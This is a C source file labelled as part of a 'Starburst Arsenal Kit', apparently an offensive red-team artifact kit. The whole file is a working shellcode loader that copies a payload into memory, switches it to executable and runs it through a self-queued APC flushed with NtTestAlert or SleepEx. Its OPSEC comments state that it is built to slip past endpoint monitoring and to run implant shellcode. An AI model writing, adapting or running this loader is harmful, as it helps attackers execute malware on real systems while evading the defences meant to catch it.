/*
 * Starburst Arsenal Kit - Self-APC Injection Bypass
 *
 * Queues a user-mode APC to the current thread pointing at the
 * shellcode, then flushes the APC queue with NtTestAlert (preferred)
 * or SleepEx(0, TRUE) as a fallback.
 *
 * OPSEC:
 *   - No thread creation (CreateThread / CreateRemoteThread).
 *   - No cross-process injection APIs.
 *   - Execution stays entirely within the current thread.
 *   - Memory transitions RW -> RX (no RWX).
 *   - NtTestAlert is a less-monitored syscall compared to alertable
 *     wait functions.
 *
 * Build: compiled alongside a main_*.c wrapper (see main_exe.c).
 */

#include <windows.h>

/* --------------------------------------------------------------------
 * NtTestAlert prototype -- not in the Windows SDK headers
 * ------------------------------------------------------------------ */
typedef LONG NTSTATUS;
typedef NTSTATUS (NTAPI *fnNtTestAlert)(void);

/* --------------------------------------------------------------------
 * Public interface: execute_shellcode
 * ------------------------------------------------------------------ */
void execute_shellcode(unsigned char *shellcode, unsigned int shellcode_len)
{
    LPVOID        exec_mem;
    DWORD         oldProtect;
    HMODULE       hNtdll;
    fnNtTestAlert pNtTestAlert;

    if (!shellcode || shellcode_len == 0)
        return;

    /* Allocate RW memory */
    exec_mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem)
        return;

    /* Copy shellcode */
    memcpy(exec_mem, shellcode, shellcode_len);

    /* Transition to RX */
    if (!VirtualProtect(exec_mem, shellcode_len, PAGE_EXECUTE_READ, &oldProtect))
    {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return;
    }

    /* Queue a user APC to the current thread.
     * PAPCFUNC signature is: void CALLBACK func(ULONG_PTR dwParam);
     * Shellcode typically ignores the parameter.                      */
    if (!QueueUserAPC((PAPCFUNC)exec_mem, GetCurrentThread(), 0))
    {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return;
    }

    /* Flush the APC queue to trigger execution.
     *
     * Method 1 (preferred): NtTestAlert
     *   Dispatches all queued APCs without entering an alertable wait.
     *   Less commonly hooked / monitored than SleepEx.
     *
     * Method 2 (fallback): SleepEx(0, TRUE)
     *   Enters an alertable wait state for 0 ms, which dispatches
     *   pending APCs.  More commonly monitored but universally available.
     */
    hNtdll = GetModuleHandleA("ntdll.dll");
    pNtTestAlert = NULL;

    if (hNtdll)
        pNtTestAlert = (fnNtTestAlert)GetProcAddress(hNtdll, "NtTestAlert");

    if (pNtTestAlert)
    {
        /* Method 1: NtTestAlert */
        pNtTestAlert();
    }
    else
    {
        /* Method 2: Alertable wait fallback */
        SleepEx(0, TRUE);
    }

    /* If shellcode returns, clean up.
     * Note: most implant shellcode will not return.  */
    VirtualFree(exec_mem, 0, MEM_RELEASE);
}
